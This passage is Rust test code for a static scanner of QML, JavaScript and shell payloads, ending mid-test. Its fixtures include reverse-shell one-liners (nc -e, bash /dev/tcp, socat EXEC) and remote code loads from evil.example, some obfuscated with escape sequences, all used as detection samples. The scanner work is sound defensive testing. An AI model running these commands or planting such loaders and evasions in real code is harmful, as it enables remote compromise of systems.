        let ids_py = rule_ids(&artifacts_py);
        assert!(
            !ids_py.contains(&"oma.python.download-execute".to_owned()),
            "{ids_py:?}"
        );

        // Dynamic-code spelling inside a quoted value is capability-level.
        let js = "var s = \"new Function(payload)\";\n";
        let (artifacts_js, _) = one("lit.js", PayloadKind::JavaScript, js);
        let ids_js = rule_ids(&artifacts_js);
        assert!(
            !ids_js.contains(&DYNAMIC_CODE_RULE.to_owned()),
            "{ids_js:?}"
        );
    }
}

#[cfg(test)]
mod h2_reference_tests {
    use super::s4_family_tests::{rule_ids, run};
    use super::*;
    use omasafe_core::bounds::TimeBudget;

    fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
        PayloadEntry {
            relative_path: path.to_owned(),
            kind,
            mode: 0o644,
            size: size as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: false,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        }
    }

    fn one(path: &str, kind: PayloadKind, source: &str) -> (AnalysisArtifacts, PayloadInventory) {
        super::s4_family_tests::run(
            vec![entry(path, kind, source.len())],
            &[(path, source.as_bytes())],
        )
    }

    fn rejection_limitations(artifacts: &AnalysisArtifacts) -> Vec<&String> {
        artifacts
            .limitations
            .iter()
            .filter(|limitation| limitation.starts_with("sink-reference-rejected:"))
            .collect()
    }

    #[test]
    fn literal_remote_loader_source_is_a_high_finding() {
        let source = r#"import QtQuick
Item {
    Loader { source: "https://evil.example/W.qml" }
}
"#;
        let (artifacts, _) = one("R.qml", PayloadKind::Qml, source);
        let findings = artifacts.rendered_findings();
        let remote: Vec<_> = findings
            .iter()
            .filter(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE)
            .collect();
        assert_eq!(remote.len(), 1, "{findings:?}");
        assert_eq!(remote[0].severity, "high");
        assert!(
            remote[0]
                .evidence
                .starts_with("remote-component-load:Loader.source:https://evil.example/W.qml"),
            "{}",
            remote[0].evidence
        );
        // The finding is the disclosure: no sink rejection on top.
        assert!(rejection_limitations(&artifacts).is_empty());
        #[cfg(feature = "qml-parser")]
        assert_eq!(remote[0].confidence.as_deref(), Some("ast-backed"));
        #[cfg(not(feature = "qml-parser"))]
        assert_eq!(remote[0].confidence.as_deref(), Some("lexical-fallback"));
    }

    #[test]
    fn remote_create_component_is_a_high_finding_with_dynamic_code() {
        let source = r#"import QtQuick
Item {
    Component.onCompleted: {
        var c = Qt.createComponent("https://evil.example/W.qml")
    }
}
"#;
        let (artifacts, _) = one("C.qml", PayloadKind::Qml, source);
        let findings = artifacts.rendered_findings();
        let remote: Vec<_> = findings
            .iter()
            .filter(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE)
            .collect();
        assert_eq!(remote.len(), 1, "{findings:?}");
        assert_eq!(remote[0].severity, "high");
        assert!(
            remote[0]
                .evidence
                .starts_with("remote-component-load:Qt.createComponent:https://"),
            "{}",
            remote[0].evidence
        );
        assert!(
            findings
                .iter()
                .any(|finding| finding.rule_id == DYNAMIC_CODE_RULE),
            "createComponent joins the dynamic-code family: {findings:?}"
        );
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "dynamic-code-execution"),
            "{:?}",
            artifacts.capabilities
        );
    }

    #[test]
    fn remote_directory_import_is_indicator_only() {
        // H0 probe C: remote directory imports are scanner-intercepted on the
        // pinned runtime. Both `as`-qualified and bare spellings record the
        // indicator and must never carry the High remote-load rule.
        let source = r#"import QtQuick
import "https://plugins.example/remote/qml" as Remote
import "https://plugins.example/bare"
Item {}
"#;
        let (artifacts, _) = one("I.qml", PayloadKind::Qml, source);
        let findings = artifacts.rendered_findings();
        assert_eq!(findings.len(), 2, "{findings:?}");
        assert!(
            findings
                .iter()
                .all(|finding| finding.rule_id == REMOTE_DIRECTORY_IMPORT_RULE
                    && finding.severity == "low"),
            "{findings:?}"
        );
        assert!(rejection_limitations(&artifacts).is_empty());
    }

    #[test]
    fn local_directory_imports_stay_silent() {
        let source = r#"import QtQuick
import "./widgets" as Widgets
import "widgets"
Item {}
"#;
        let (artifacts, _) = one("L.qml", PayloadKind::Qml, source);
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            rule_ids(&artifacts)
        );
        assert!(
            artifacts.limitations.is_empty(),
            "{:?}",
            artifacts.limitations
        );
    }

    #[test]
    fn out_of_tree_absolute_and_traversal_loads_are_medium_findings() {
        let source = r#"Item {
    Loader { source: "/tmp/staged.qml" }
    Loader { source: "../outside/W.qml" }
}
"#;
        let (artifacts, _) = one("O.qml", PayloadKind::Qml, source);
        let findings = artifacts.rendered_findings();
        assert_eq!(findings.len(), 2, "{findings:?}");
        assert!(
            findings.iter().all(|finding| {
                finding.rule_id == OUT_OF_TREE_REFERENCE_RULE && finding.severity == "medium"
            }),
            "{findings:?}"
        );
        assert!(rejection_limitations(&artifacts).is_empty());
        assert!(
            !rule_ids(&artifacts).contains(&REMOTE_COMPONENT_LOAD_RULE.to_owned()),
            "{ids:?}",
            ids = rule_ids(&artifacts)
        );
    }

    #[test]
    fn qt_include_sinks_split_remote_from_out_of_tree() {
        // Qt.include is a load sink for the Medium out-of-tree rule, but the
        // High remote rule covers only the two H0-verified positions: a
        // remote include surfaces as a typed rejection instead.
        let source = r#"Item {
    Component.onCompleted: {
        Qt.include("/opt/extra.js")
        Qt.include("https://evil.example/extra.js")
        Qt.include("./helper.js")
    }
}
"#;
        let (artifacts, inventory) = run(
            vec![
                entry("I.qml", PayloadKind::Qml, source.len()),
                entry("helper.js", PayloadKind::JavaScript, 16),
            ],
            &[
                ("I.qml", source.as_bytes()),
                ("helper.js", b"// helper\n".repeat(2).as_slice()),
            ],
        );
        let findings = artifacts.rendered_findings();
        assert!(
            findings
                .iter()
                .any(|finding| finding.rule_id == OUT_OF_TREE_REFERENCE_RULE
                    && finding.evidence == "out-of-tree-reference:Qt.include:/opt/extra.js"),
            "{findings:?}"
        );
        assert!(
            !findings
                .iter()
                .any(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE),
            "Qt.include remote is not the High remote-load rule: {findings:?}"
        );
        let rejections = rejection_limitations(&artifacts);
        assert_eq!(rejections.len(), 1, "{:?}", artifacts.limitations);
        assert!(
            rejections[0]
                .contains("sink-reference-rejected:remote:I.qml:4:https://evil.example/extra.js")
        );
        // The local relative include still resolves as an invocation edge.
        assert!(
            artifacts
                .edges
                .iter()
                .any(|edge| edge.target_path == "helper.js"),
            "{:?}",
            artifacts.edges
        );
        assert!(inventory.entries[1].invocation_target);
    }

    #[test]
    fn sink_position_rejections_carry_typed_reasons() {
        let source = r#"Item {
    FileView { path: "https://example.test/config" }
    Process { command: ["grim", "-g", "/tmp/shot.png"] }
    Loader { source: "Missing.qml" }
    Loader { source: "qrc:/built-in/Page.qml" }
}
"#;
        let (artifacts, _) = one("S.qml", PayloadKind::Qml, source);
        // Argument and file sinks surface typed rejections, never load-sink
        // findings.
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            rule_ids(&artifacts)
        );
        let rejections = rejection_limitations(&artifacts);
        assert_eq!(rejections.len(), 4, "{:?}", artifacts.limitations);
        for expected in [
            "sink-reference-rejected:remote:S.qml:2:https://example.test/config",
            "sink-reference-rejected:absolute:S.qml:3:/tmp/shot.png",
            "sink-reference-rejected:missing-local-target:S.qml:4:Missing.qml",
            "sink-reference-rejected:unsupported-scheme:S.qml:5:qrc:/built-in/Page.qml",
        ] {
            assert!(
                rejections.iter().any(|limitation| **limitation == expected),
                "missing {expected} in {rejections:?}"
            );
        }
    }

    #[test]
    fn non_sink_references_stay_inventory_context() {
        // Icon names, format strings, commented URLs, and any unresolvable
        // path-shaped string outside a sink position produce no finding and
        // no limitation (R-2).
        let source = r#"import QtQuick
Item {
    property string icon: "media-playback-start"
    readonly property string labelPattern: "%1/%2.json"
    Text { text: "%1/%2.json" }
    // see https://example.test/spec for details
    Component.onCompleted: console.log(labelPattern.arg(1).arg(2))
}
"#;
        let (artifacts, _) = one("N.qml", PayloadKind::Qml, source);
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            rule_ids(&artifacts)
        );
        assert!(
            artifacts.limitations.is_empty(),
            "{:?}",
            artifacts.limitations
        );
    }

    #[test]
    fn resolving_sink_references_still_form_edges() {
        let qml = "Item { Loader { source: \"./Panel.qml\" } }\n";
        let (artifacts, inventory) = run(
            vec![
                entry("App.qml", PayloadKind::Qml, qml.len()),
                entry("Panel.qml", PayloadKind::Qml, 10),
            ],
            &[
                ("App.qml", qml.as_bytes()),
                ("Panel.qml", b"Text {}\n".repeat(2).as_slice()),
            ],
        );
        assert!(
            artifacts
                .edges
                .iter()
                .any(|edge| edge.target_path == "Panel.qml"),
            "{:?}",
            artifacts.edges
        );
        assert!(inventory.entries[1].invocation_target);
        assert!(
            artifacts.limitations.is_empty(),
            "{:?}",
            artifacts.limitations
        );
    }

    #[test]
    fn create_component_and_include_join_lexical_dynamic_code() {
        let source = "Qt.createComponent(payload)\nQt.include(module)\n";
        let (artifacts, _) = one("n.js", PayloadKind::JavaScript, source);
        let ids = rule_ids(&artifacts);
        assert_eq!(
            ids.iter().filter(|id| **id == DYNAMIC_CODE_RULE).count(),
            2,
            "{ids:?}"
        );
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "dynamic-code-execution"),
            "{:?}",
            artifacts.capabilities
        );
    }

    #[test]
    fn lexical_lines_carry_sink_rejections_on_standalone_js() {
        // Standalone .js files are always lexical (ADR 0001); a literal
        // createComponent argument outside the tree surfaces its typed
        // rejection there too.
        let source = r#"var component = Qt.createComponent("Missing.qml")
"#;
        let (artifacts, _) = one("view.js", PayloadKind::JavaScript, source);
        let rejections = rejection_limitations(&artifacts);
        assert_eq!(rejections.len(), 1, "{:?}", artifacts.limitations);
        assert!(
            rejections[0]
                .contains("sink-reference-rejected:missing-local-target:view.js:1:Missing.qml")
        );
    }

    #[test]
    fn analysis_time_budget_still_bounds_rejection_collection() {
        let source = "Loader { source: \"Missing.qml\" }\n";
        let mut inventory = PayloadInventory {
            entries: vec![entry("A.qml", PayloadKind::Qml, source.len())],
            ..Default::default()
        };
        let expired = TimeBudget::new(std::time::Duration::ZERO);
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &expired,
        );
        assert!(
            artifacts
                .limitations
                .iter()
                .any(|limitation| limitation == "analysis_time_budget_exhausted")
        );
        assert!(rejection_limitations(&artifacts).is_empty());
    }

    // -------------------------------------------------------------------
    // H2 review boundaries: escape decoding, qualified types, centralized
    // scheme parsing, Qt-receiver verification, rejection bounds, and
    // lexical span scoping.
    // -------------------------------------------------------------------

    #[test]
    fn escaped_remote_literal_decodes_to_the_runtime_value() {
        // "\x68ttps://…" evaluates to "https://…" at runtime; the escaped
        // spelling must reach the High rule on both extraction paths.
        let source = "Item { Loader { source: \"\\x68ttps://evil.example/W.qml\" } }\n";
        let (artifacts, _) = one("E.qml", PayloadKind::Qml, source);
        let findings = artifacts.rendered_findings();
        let remote: Vec<_> = findings
            .iter()
            .filter(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE)
            .collect();
        assert_eq!(remote.len(), 1, "{findings:?}");
        assert_eq!(remote[0].severity, "high");
        assert_eq!(
            remote[0].evidence,
            "remote-component-load:Loader.source:https://evil.example/W.qml"
        );
    }

    #[test]
    fn unicode_escape_and_doubled_backslash_are_decoded_exactly_once() {
        // \u0068 is 'h': the createComponent literal is a remote URL.
        let source = "Item { Component.onCompleted: Qt.createComponent(\"\\u0068ttps://evil.example/W.qml\") }\n";
        let (artifacts, _) = one("U.qml", PayloadKind::Qml, source);
        let findings = artifacts.rendered_findings();
        let remote: Vec<_> = findings
            .iter()
            .filter(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE)
            .collect();
        assert_eq!(remote.len(), 1, "{findings:?}");
        assert_eq!(
            remote[0].evidence,
            "remote-component-load:Qt.createComponent:https://evil.example/W.qml"
        );

        // A literal backslash produced by `\\` must not be re-decoded into
        // scheme characters: the runtime value is "\x68ttps://x", not a URL.
        let literal = "Item { Loader { source: \"\\\\\\x68ttps://x\" } }\n";
        let (artifacts, _) = one("B.qml", PayloadKind::Qml, literal);
        assert!(
            !artifacts
                .rendered_findings()
                .iter()
                .any(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE),
            "{:?}",
            artifacts.rendered_findings()
        );
    }

    #[test]
    fn qualified_loader_types_reach_the_sink() {
        let qml = r#"import QtQuick as QQ
Item {
    QQ.Loader { source: "https://evil.example/W.qml" }
    QQ.Loader { source: "./Panel.qml" }
    Io.Process { command: ["sh", "-c", "ls"] }
}
"#;
        let (artifacts, inventory) = run(
            vec![
                entry("Q.qml", PayloadKind::Qml, qml.len()),
                entry("Panel.qml", PayloadKind::Qml, 10),
            ],
            &[
                ("Q.qml", qml.as_bytes()),
                ("Panel.qml", b"Text {}\n".repeat(2).as_slice()),
            ],
        );
        let findings = artifacts.rendered_findings();
        let remote: Vec<_> = findings
            .iter()
            .filter(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE)
            .collect();
        assert_eq!(remote.len(), 1, "{findings:?}");
        assert!(
            remote[0]
                .evidence
                .starts_with("remote-component-load:Loader.source:https://"),
            "{}",
            remote[0].evidence
        );
        // The qualified Process type still surfaces its capability and its
        // argv provenance judgment.
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "process-execution"),
            "{:?}",
            artifacts.capabilities
        );
        assert!(
            findings
                .iter()
                .any(|finding| finding.rule_id == PROCESS_RULE),
            "{findings:?}"
        );
        // The local qualified Loader reference still resolves as an edge.
        assert!(
            artifacts
                .edges
                .iter()
                .any(|edge| edge.target_path == "Panel.qml"),
            "{:?}",
            artifacts.edges
        );
        assert!(inventory.entries[1].invocation_target);
    }

    #[test]
    fn scheme_parsing_is_case_insensitive_and_file_urls_are_out_of_tree() {
        let source = r#"Item {
    Loader { source: "HTTPS://evil.example/W.qml" }
    Loader { source: "file:///tmp/X.qml" }
    FileView { path: "file:///etc/example.conf" }
}
"#;
        let (artifacts, _) = one("S2.qml", PayloadKind::Qml, source);
        let findings = artifacts.rendered_findings();
        // Uppercase scheme keeps the High remote verdict, with the original
        // spelling preserved in evidence.
        let remote: Vec<_> = findings
            .iter()
            .filter(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE)
            .collect();
        assert_eq!(remote.len(), 1, "{findings:?}");
        assert!(
            remote[0]
                .evidence
                .starts_with("remote-component-load:Loader.source:HTTPS://"),
            "{}",
            remote[0].evidence
        );
        // A file:// URL is a local out-of-tree load, never remote and never
        // a mere unsupported scheme.
        let out_of_tree: Vec<_> = findings
            .iter()
            .filter(|finding| finding.rule_id == OUT_OF_TREE_REFERENCE_RULE)
            .collect();
        assert_eq!(out_of_tree.len(), 1, "{findings:?}");
        assert_eq!(out_of_tree[0].severity, "medium");
        assert!(
            out_of_tree[0]
                .evidence
                .starts_with("out-of-tree-reference:Loader.source:file:///tmp/X.qml"),
            "{}",
            out_of_tree[0].evidence
        );
        // file:// at a non-load sink is a typed rejection with the absolute
        // reason.
        let rejections = rejection_limitations(&artifacts);
        assert_eq!(rejections.len(), 1, "{:?}", artifacts.limitations);
        assert!(
            rejections[0]
                .contains("sink-reference-rejected:absolute:S2.qml:4:file:///etc/example.conf")
        );
    }

    #[test]
    fn non_qt_receivers_do_not_carry_qt_rules() {
        let source = r#"Item {
    Component.onCompleted: {
        backend.createComponent("https://docs.example/X.qml")
        backend.include("/opt/x.js")
    }
}
"#;
        let (artifacts, _) = one("NQ.qml", PayloadKind::Qml, source);
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            rule_ids(&artifacts)
        );
        assert!(
            artifacts.limitations.is_empty(),
            "{:?}",
            artifacts.limitations
        );
    }

    #[test]
    fn non_qt_receivers_stay_quiet_on_lexical_paths() {
        let source = r#"backend.createComponent("https://docs.example/X.qml")
backend.include("/opt/x.js")
var component = Qt.createComponent("Missing.qml")
"#;
        let (artifacts, _) = one("nq.js", PayloadKind::JavaScript, source);
        // The user-defined calls stay context; the Qt-global call on line 3
        // still participates.
        assert!(
            rule_ids(&artifacts)
                .iter()
                .all(|id| id == DYNAMIC_CODE_RULE),
            "{:?}",
            rule_ids(&artifacts)
        );
        let rejections = rejection_limitations(&artifacts);
        assert_eq!(rejections.len(), 1, "{:?}", artifacts.limitations);
        assert!(rejections[0].contains(":missing-local-target:nq.js:3:Missing.qml"));
    }

    #[test]
    fn sink_rejections_are_capped_and_truncation_is_disclosed() {
        let overflow = 8;
        let count = MAX_SINK_REJECTIONS + overflow;
        let mut source = String::from("Item {\n");
        for index in 0..count {
            source.push_str(&format!(
                "    Loader {{ source: \"Missing{index}.qml\" }}\n"
            ));
        }
        source.push_str("}\n");
        let (artifacts, _) = one("Cap.qml", PayloadKind::Qml, &source);
        let rejections = rejection_limitations(&artifacts);
        assert_eq!(rejections.len(), MAX_SINK_REJECTIONS);
        // The truncation count is the number of omitted OCCURRENCES (H2
        // review); here each of the 8 overflow values occurs exactly once.
        assert!(
            artifacts.limitations.iter().any(|limitation| limitation
                == &format!("sink-reference-rejections-truncated:{overflow}")),
            "{:?}",
            artifacts.limitations
        );
    }

    #[test]
    fn overflow_counts_occurrences_once_the_unique_set_is_full() {
        // Once the retained set is full, omitted rejections are counted per
        // OCCURRENCE (H2 review): remembering which values were omitted
        // would need unbounded fingerprints under adversarial input. Two
        // occurrences of the same value past the full set count as two.
        let mut source = String::from("Item {\n");
        for index in 0..MAX_SINK_REJECTIONS {
            source.push_str(&format!("    Loader {{ source: \"Fill{index}.qml\" }}\n"));
        }
        source.push_str("    Loader { source: \"Over.qml\" } Loader { source: \"Over.qml\" }\n");
        source.push_str("}\n");
        let (artifacts, _) = one("Occ.js", PayloadKind::JavaScript, &source);
        let rejections = rejection_limitations(&artifacts);
        assert_eq!(rejections.len(), MAX_SINK_REJECTIONS);
        assert!(
            artifacts
                .limitations
                .iter()
                .any(|limitation| limitation == "sink-reference-rejections-truncated:2"),
            "{:?}",
            artifacts.limitations
        );
    }

    #[test]
    fn duplicate_rejections_do_not_crowd_out_a_later_unique_or_report_truncation() {
        // MAX_SINK_REJECTIONS identical rejections followed by one distinct
        // rejection: the unique one must be retained and no truncation
        // reported, since duplicates carry no new information. The copies must
        // share a line so the rejection strings (which embed the line number)
        // are truly identical.
        let mut source = String::new();
        for _ in 0..MAX_SINK_REJECTIONS {
            source.push_str("Loader { source: \"Dup.qml\" } ");
        }
        source.push_str("Loader { source: \"Unique.qml\" }\n");
        let (artifacts, _) = one("Dupes.js", PayloadKind::JavaScript, &source);
        let rejections = rejection_limitations(&artifacts);
        assert_eq!(rejections.len(), 2, "{:?}", artifacts.limitations);
        assert!(
            rejections.iter().any(|r| r.contains(":Unique.qml")),
            "the later unique rejection must survive: {rejections:?}"
        );
        assert!(
            !artifacts
                .limitations
                .iter()
                .any(|limitation| limitation.starts_with("sink-reference-rejections-truncated:")),
            "duplicate-only overflow must not report truncation: {:?}",
            artifacts.limitations
        );
    }

    #[test]
    fn unrelated_literals_on_a_sink_line_do_not_inherit_the_sink() {
        // Lexical span scoping (H2 review): only the binding/call argument
        // span participates, so a second literal sharing the line stays
        // inventory context even in the no-parser build.
        let source = r#"Loader { source: "Panel.qml"; property string docs: "https://docs.example" }
var command = "themes/legacy/x.json"
"#;
        let (artifacts, _) = one("M.js", PayloadKind::JavaScript, source);
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            rule_ids(&artifacts)
        );
        // Only "Panel.qml" is a sink-position rejection; the docs URL and
        // the command string never inherit the sink.
        let rejections = rejection_limitations(&artifacts);
        assert_eq!(rejections.len(), 1, "{:?}", artifacts.limitations);
        assert!(rejections[0].contains(":missing-local-target:M.js:1:Panel.qml"));
    }

    #[test]
    fn nested_bindings_do_not_inherit_the_outer_loader_sink() {
        // The object brace scope includes nested child objects, so only
        // depth-zero bindings of the matched object may participate (H2
        // review): the nested Image's remote source must not become a
        // Loader.source High finding. `.js` is always lexical.
        let nested = r#"Loader { Image { source: "https://docs.example/logo.qml" } }
"#;
        let (artifacts, _) = one("Nest.js", PayloadKind::JavaScript, nested);
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            rule_ids(&artifacts)
        );
        assert!(
            artifacts.limitations.is_empty(),
            "{:?}",
            artifacts.limitations
        );

        // The complement: a depth-zero binding of the owning object still
        // participates next to a nested child.
        let mixed = r#"Loader { Image { source: "https://docs.example/logo.qml" } source: "Panel.qml" }
"#;
        let (artifacts, _) = one("Nest2.js", PayloadKind::JavaScript, mixed);
        let rejections = rejection_limitations(&artifacts);
        assert_eq!(rejections.len(), 1, "{:?}", artifacts.limitations);
        assert!(
            rejections[0].contains(":missing-local-target:Nest2.js:1:Panel.qml"),
            "{rejections:?}"
        );
    }

    #[cfg(feature = "qml-parser")]
    #[test]
    fn nested_qml_bindings_do_not_inherit_the_outer_loader_sink_ast() {
        // AST parity: the nested Image is its own object definition and its
        // remote source is not a Loader sink.
        let source = "Item { Loader { Image { source: \"https://docs.example/logo.qml\" } } }\n";
        let (artifacts, _) = one("Nest.qml", PayloadKind::Qml, source);
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            rule_ids(&artifacts)
        );
        assert!(
            artifacts.limitations.is_empty(),
            "{:?}",
            artifacts.limitations
        );
    }

    #[test]
    fn lexical_dynamic_code_follows_the_qt_receiver_rule() {
        // `backend.Qt.createComponent(...)` is a member named Qt — dynamic
        // code must NOT fire (H2 review); `Qt . createComponent(...)` with
        // whitespace around the dot IS the Qt API and must fire BOTH the
        // dynamic-code finding and the remote-load finding.
        let member = "var c = backend.Qt.createComponent(payload)\n";
        let (artifacts, _) = one("dm.js", PayloadKind::JavaScript, member);
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            rule_ids(&artifacts)
        );

        let spaced = "var c = Qt . createComponent(\"https://evil.example/W.qml\")\n";
        let (artifacts, _) = one("ds.js", PayloadKind::JavaScript, spaced);
        let ids = rule_ids(&artifacts);
        assert!(
            ids.contains(&DYNAMIC_CODE_RULE.to_owned()),
            "spaced Qt.createComponent must carry dynamic code: {ids:?}"
        );
        assert!(
            ids.contains(&REMOTE_COMPONENT_LOAD_RULE.to_owned()),
            "spaced Qt.createComponent must carry the remote-load rule: {ids:?}"
        );
    }

    #[test]
    fn line_continuation_and_legacy_octal_escapes_decode_to_runtime_values() {
        // Backslash + line terminator is a continuation: it evaluates to the
        // empty string, so `"ht\<LF>tps://…"` is `https://…` at runtime.
        assert_eq!(decode_js_escapes("ht\\\ntps://x"), "https://x");
        assert_eq!(decode_js_escapes("a\\\r\nb"), "ab"); // CRLF is one sequence
        assert_eq!(decode_js_escapes("a\\\rb"), "ab"); // lone CR
        assert_eq!(decode_js_escapes("a\\\u{2028}b"), "ab"); // line separator
        assert_eq!(decode_js_escapes("a\\\u{2029}b"), "ab"); // paragraph separator
        // Legacy octal escapes (Annex B): value is the octal number.
        assert_eq!(decode_js_escapes("\\101"), "A"); // \101 == 'A'
        assert_eq!(decode_js_escapes("\\1"), "\u{0001}"); // single octal digit
        assert_eq!(decode_js_escapes("\\0"), "\0"); // NUL
        assert_eq!(decode_js_escapes("\\478"), "'8"); // 4-7 caps at two digits: \47='\'' then '8'
    }

    #[test]
    fn line_continuation_in_a_load_sink_still_reaches_the_high_rule() {
        // A continuation splits an https URL across the escape; the decoded
        // runtime value is a remote load and must not slip past the rule. The
        // AST build parses the multi-line string as one literal.
        #[cfg(feature = "qml-parser")]
        {
            let source = "Item { Loader { source: \"ht\\\ntps://evil.example/W.qml\" } }\n";
            let (artifacts, _) = one("LC.qml", PayloadKind::Qml, source);
            let remote: Vec<_> = artifacts
                .rendered_findings()
                .into_iter()
                .filter(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE)
                .collect();
            assert_eq!(remote.len(), 1, "{:?}", artifacts.rendered_findings());
            assert_eq!(
                remote[0].evidence,
                "remote-component-load:Loader.source:https://evil.example/W.qml"
            );
        }
    }

    #[cfg(feature = "qml-parser")]
    #[test]
    fn parenthesized_qt_receiver_still_reaches_the_sink() {
        // `(Qt).createComponent(...)` is the same Qt-global call; the
        // parenthesized receiver must be unwrapped before the receiver check.
        let source = "Item { Component.onCompleted: (Qt).createComponent(\"https://evil.example/W.qml\") }\n";
        let (artifacts, _) = one("PQ.qml", PayloadKind::Qml, source);
        let remote: Vec<_> = artifacts
            .rendered_findings()
            .into_iter()
            .filter(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE)
            .collect();
        assert_eq!(remote.len(), 1, "{:?}", artifacts.rendered_findings());
    }

    #[test]
    fn lexical_qt_matching_is_receiver_exact() {
        // A member named Qt (`backend.Qt.createComponent`) is NOT the Qt
        // global and must not produce a High finding. `.js` is always lexical.
        let miss = "var c = backend.Qt.createComponent(\"https://docs.example/X.qml\")\n";
        let (artifacts, _) = one("miss.js", PayloadKind::JavaScript, miss);
        assert!(
            !artifacts
                .rendered_findings()
                .iter()
                .any(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE),
            "member Qt must not match: {:?}",
            artifacts.rendered_findings()
        );

        // Whitespace around the dot is still the Qt global: High.
        let hit = "var c = Qt . createComponent(\"https://evil.example/W.qml\")\n";
        let (artifacts, _) = one("hit.js", PayloadKind::JavaScript, hit);
        assert!(
            artifacts
                .rendered_findings()
                .iter()
                .any(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE),
            "spaced Qt.createComponent must match: {:?}",
            artifacts.rendered_findings()
        );
    }

    #[test]
    fn lexical_qt_sink_marks_only_the_first_argument() {
        // Only the first argument of createComponent is the loaded URL; a URL
        // in a later argument must not become a High finding.
        let source = "var c = Qt.createComponent(mode, \"https://evil.example/W.qml\")\n";
        let (artifacts, _) = one("arg.js", PayloadKind::JavaScript, source);
        assert!(
            !artifacts
                .rendered_findings()
                .iter()
                .any(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE),
            "second-argument URL must not be marked: {:?}",
            artifacts.rendered_findings()
        );
    }

    #[cfg(not(feature = "qml-parser"))]
    #[test]
    fn lexical_binding_is_scoped_to_the_objects_braces() {
        // `Image.source` must not be attributed to the adjacent `Loader`:
        // the binding is scoped to the matching object's brace span, not the
        // shared line, so no false High finding in the lexical build.
        let source = "Loader {} Image { source: \"https://docs.example/logo.qml\" }\n";
        let (artifacts, _) = one("BS.qml", PayloadKind::Qml, source);
        assert!(
            !artifacts
                .rendered_findings()
                .iter()
                .any(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE),
            "Image.source is not Loader.source: {:?}",
            artifacts.rendered_findings()
        );
        // And it is not even recorded as a Loader sink rejection.
        assert!(
            rejection_limitations(&artifacts).is_empty(),
            "{:?}",
            artifacts.limitations
        );
    }

    #[cfg(not(feature = "qml-parser"))]
    #[test]
    fn lexical_scoped_binding_still_finds_the_owning_objects_sink() {
        // The complement of the scoping fix: a same-line Loader with its own
        // remote source is still a High finding.
        let source = "Row { Loader { source: \"https://evil.example/W.qml\" } }\n";
        let (artifacts, _) = one("BS2.qml", PayloadKind::Qml, source);
        assert!(
            artifacts
                .rendered_findings()
                .iter()
                .any(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE),
            "the owning Loader's remote source must still fire: {:?}",
            artifacts.rendered_findings()
        );
    }
}

#[cfg(test)]
mod h3_script_tests {
    use super::s4_family_tests::{rule_ids, run};
    use super::*;

    fn entry(path: &str, kind: PayloadKind, size: usize) -> PayloadEntry {
        PayloadEntry {
            relative_path: path.to_owned(),
            kind,
            mode: 0o755,
            size: size as u64,
            sha256_sampled: None,
            sampled_digest: false,
            executable: true,
            coverage_state: CoverageState::Unsupported,
            link_target: None,
            invocation_target: false,
            object_id: None,
        }
    }

    fn one(path: &str, kind: PayloadKind, source: &str) -> (AnalysisArtifacts, PayloadInventory) {
        super::s4_family_tests::run(
            vec![entry(path, kind, source.len())],
            &[(path, source.as_bytes())],
        )
    }

    fn findings_with(artifacts: &AnalysisArtifacts, rule_id: &str) -> Vec<String> {
        artifacts
            .rendered_findings()
            .iter()
            .filter(|finding| finding.rule_id == rule_id)
            .map(|finding| finding.evidence.clone())
            .collect()
    }

    #[test]
    fn reverse_shell_spellings_are_high_findings() {
        let sh = r#"#!/bin/sh
nc -e /bin/sh 203.0.113.7 4444
bash -i >& /dev/tcp/203.0.113.7/4445 0>&1
socat TCP-LISTEN:9001,reuseaddr EXEC:/bin/sh
netcat -le 4446
"#;
        let (artifacts, inventory) = one("rev.sh", PayloadKind::Shell, sh);
        let evidence = findings_with(&artifacts, SCRIPT_REVERSE_SHELL_RULE);
        assert_eq!(evidence.len(), 4, "{evidence:?}");
        for finding in artifacts.rendered_findings() {
            assert_eq!(finding.rule_id, SCRIPT_REVERSE_SHELL_RULE);
            assert_eq!(finding.severity, "high");
            assert_eq!(finding.confidence.as_deref(), Some("lexical-fallback"));
        }
        assert_eq!(inventory.entries[0].coverage_state, CoverageState::Partial);
    }

    #[test]
    fn netcat_without_execute_stays_silent() {
        for line in ["nc -lvnp 4444", "ncat 203.0.113.7 4444", "netcat -l 4444"] {
            let sh = format!("#!/bin/sh\n{line}\n");
            let (artifacts, _) = one("listen.sh", PayloadKind::Shell, &sh);
            assert!(
                findings_with(&artifacts, SCRIPT_REVERSE_SHELL_RULE).is_empty(),
                "{line} must stay silent: {:?}",
                artifacts.rendered_findings()
            );
        }
    }

    #[test]
    fn echoed_spellings_are_operands_never_commands() {
        // Second-review command-position cases: every needle word below is
        // an operand of `echo`, so no High rule may fire.
        for line in [
            "echo chmod 777 /tmp/not-executed",
